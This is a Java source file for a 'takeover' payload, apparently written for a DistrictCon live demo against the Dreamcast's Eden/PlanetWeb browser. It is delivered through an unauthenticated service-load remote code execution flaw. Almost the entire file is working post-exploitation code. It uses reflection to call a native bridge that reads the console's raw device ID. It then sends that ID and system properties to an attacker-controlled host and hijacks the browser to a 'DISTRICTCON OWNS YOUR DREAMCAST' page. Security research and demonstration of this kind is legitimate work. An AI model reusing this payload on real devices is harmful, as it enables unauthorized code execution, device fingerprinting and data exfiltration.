package org.junkyard;

import com.planetweb.eden.client.Eden;
import com.planetweb.eden.client.system.SystemInterface;
import com.planetweb.eden.client.service.Service;
import com.planetweb.eden.client.service.ServiceInfo;
import java.lang.reflect.Method;

/**
 * CHAIN "takeover": the live-demo OPENER. Delivered by the unauthenticated Eden
 * service-load RCE (F-01), this:
 *   1. proves on-device execution (reads device-only system properties),
 *   2. reads the console's RAW DEVICE ID via the Java->native sendCommand bridge
 *      (getRawDeviceID = command 101) -- proof of deep native access, and
 *   3. hijacks the browser to a full-screen "DISTRICTCON OWNS YOUR DREAMCAST"
 *      takeover page, with the leaked device ID embedded.
 * Class v45.3 (PersonalJava 1.1.8). No SecurityManager (F-02) -> fully privileged.
 */
public class TakeoverService extends Service {
    static final String HEX = "0123456789ABCDEF";

    public ServiceInfo getInfo() {
        return new ServiceInfo("JunkyardTakeover", "1.0", "DistrictCon", Junk.BASE);
    }

    public void run() {
        Junk.banner("CHAIN takeover -- full-screen RCE takeover (live demo opener)");
        Junk.prove();
        String devid = readDeviceId();
        String os = "";
        try { os = System.getProperty("os.name") + " / " + System.getProperty("os.arch")
                   + " / Java " + System.getProperty("java.version"); }
        catch (Throwable t) {}
        Eden.println("[+] device id = " + devid);
        String url = Junk.BASE + "/pwned?devid=" + enc(devid) + "&os=" + enc(os);
        Junk.openURL(url);
        Eden.println("[+] takeover delivered -> " + url);
    }

    /** getRawDeviceID via the native bridge (sendCommand 101). Tries a couple of
     *  arg shapes; returns hex of the 8-byte device-id field if recovered. */
    String readDeviceId() {
        try {
            SystemInterface si = Eden.getSystemInterface();
            Method m = SystemInterface.class.getDeclaredMethod(
                "sendMessage", new Class[]{ Integer.TYPE, Object.class, Object.class });
            m.setAccessible(true);
            // (a) maybe the handler returns the bytes
            Object r = m.invoke(si, new Object[]{ new Integer(101), null, null });
            if (r instanceof byte[] && ((byte[]) r).length > 0) return hex((byte[]) r);
            if (r != null && !(r instanceof byte[])) return r.toString();
            // (b) maybe it fills a provided buffer
            byte[] buf = new byte[16];
            m.invoke(si, new Object[]{ new Integer(101), buf, null });
            for (int i = 0; i < buf.length; i++) if (buf[i] != 0) return hex(buf);
            return "(reachable; field empty)";
        } catch (Throwable t) {
            Eden.println("[!] getRawDeviceID: " + t);
            return "(native bridge blocked)";
        }
    }

    static String hex(byte[] b) {
        StringBuffer s = new StringBuffer();
        for (int i = 0; i < b.length; i++) {
            int v = b[i] & 0xff;
            s.append(HEX.charAt(v >> 4)).append(HEX.charAt(v & 0xf));
            if (i + 1 < b.length) s.append(':');
        }
        return s.toString();
    }

    /** minimal, PersonalJava-1.1-safe URL encoding */
    static String enc(String s) {
        if (s == null) return "";
        StringBuffer o = new StringBuffer();
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9'))
                o.append(c);
            else o.append('%').append(HEX.charAt((c >> 4) & 0xf)).append(HEX.charAt(c & 0xf));
        }
        return o.toString();
    }
}
